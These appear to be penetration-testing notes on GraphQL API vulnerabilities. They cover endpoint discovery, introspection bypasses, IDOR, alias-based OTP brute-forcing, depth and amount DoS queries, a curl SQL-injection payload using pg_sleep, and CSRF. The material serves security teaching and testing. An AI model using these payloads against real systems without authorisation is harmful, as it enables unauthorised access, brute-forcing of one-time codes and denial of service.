# GraphQL API Testing

**What is GraphQL? Why is it used?**
- Just one endpoint - easier for developers
- Instead of making requests to different URIs for an operation, queries are send to the single endpoint for operations

**Common Terms**
- Queries: Fetch data
- Mutations: Edit data
- Fragments: Easily save lists of fields
- Metafields: Inspect query or mutation information

**Why should it be tested?**
- Relatively new tech
- Developer might adopt it without being fully aware of security concerns

## Enumerating GraphQL endpoints
- Common endpoint names
  ```  
    /graphql
    /qql
    /graphiql
    /api
    /api/graphql
    /graphql/api
    /graphql/graphql
    /graphql/console
  ```
  
- Confirm if an endpoint is GraphQL using Universal queries - Every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string
  ```
  # Send the query
  query{__typename}
  
  # You should receive a response containing this string if it is a GraphQL endpoint
  {"data": {"__typename": "query"}}  
  ```
  
- Abuse the GraphQL Introspection (if not disabled) feature

## Introspection
- Built-in feature that enables you to retrieve information about the GraphQL schema
- Used by developers to form queries
- Should be disabled in production - can disclose potentially sensitive data

Simple Introspection Query - Manual
  ```
  {
        "query": "{__schema{queryType{name}}}"
  }  
  ```

Introspection - Automated tools
  - InQL: BurpSuite addon
  - GraphQL Map: CLI tool

Visualizing introspection results
  - GraphQL voyager
  - [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/)

If introspection is disabled
  - Abuse verbose error messages. Use [Clairvoyance (tool)](https://github.com/nikitastupin/clairvoyance)
  - Send the introspection probe via another HTTP method
  - If introspection is disabled using regex - try inserting characters like spaces, new lines and commas after `__schema{` since they are ignored by GraphQL but could bypass regex
 
## IDOR
```
# Query a product that we don't have access to, by guessing the id

    query {
        product(id: "1337") {
            id
            name
        }
    }
```

## Rate Limit bypass using Alias
A query can't return more than one property with the same name. To bypass this restriction we can use aliases.
```
# Example alias

query getProductDetails {
        product1: getProduct(id: "1") {             <------ Property 1
            id
            name
        }
        product2: getProduct(id: "2") {             <------ Property 2
            id
            name
        }
    }
```
Such queries with aliases can be used to **perform multiple operations on an endpoint in one request** - bypassing request based rate limiting
```
# Example bruteforce OTP

query isValidOTP($code: Int) {
        isValidOTP(code:$code){
            valid
        }
        isValidOTP2:isValidDiscount(code:$code){
            valid
        }
        isValidOTP3:isValidDiscount(code:$code){
            valid
        }
    }
```

## DOS
Depth DoS
```
query evil {            # Depth: 0
  album(id: 42) {       # Depth: 1
    songs {             # Depth: 2
      album {           # Depth: 3
        ...             # Depth: ...
        album {id: N}   # Depth: N
      }
    }
  }
}
```
Amount DoS
```
query {
  author(id: "abc") {
    posts(first: 99999999) {             <---- Huge amount
      title
    }
  }
}
```

## SQL/NoSQL Injection
See H1 report - [SQL injection in GraphQL endpoint](https://hackerone.com/reports/435066)

```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## CSRF
See H1 report - [CSRF allows executing mutations through GET requests](https://hackerone.com/reports/1122408)
- Where a GraphQL endpoint does
  - Not Validate the content type of the requests sent to it - `x-www-form-urlencoded` GET requests, instead of `application/json` POST requests
  - Not implement CSRF tokens. 


**References**
1. [Katie Paxton Fear Finding Your Next Bug: GraphQL](https://www.youtube.com/watch?v=jyjGneKJynk)
2. [Katie Paxton Fear Hunting for bugs in GraphQL APIs (Demo)](https://www.youtube.com/watch?v=viWzbPuGqpo)
3. [Introduction To GraphQL Penetration Test](https://www.youtube.com/watch?v=iSZ0RrCrpf4)
4. [PortSwigger GraphQL API vulnerabilities ](https://portswigger.net/web-security/graphql)
5. [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
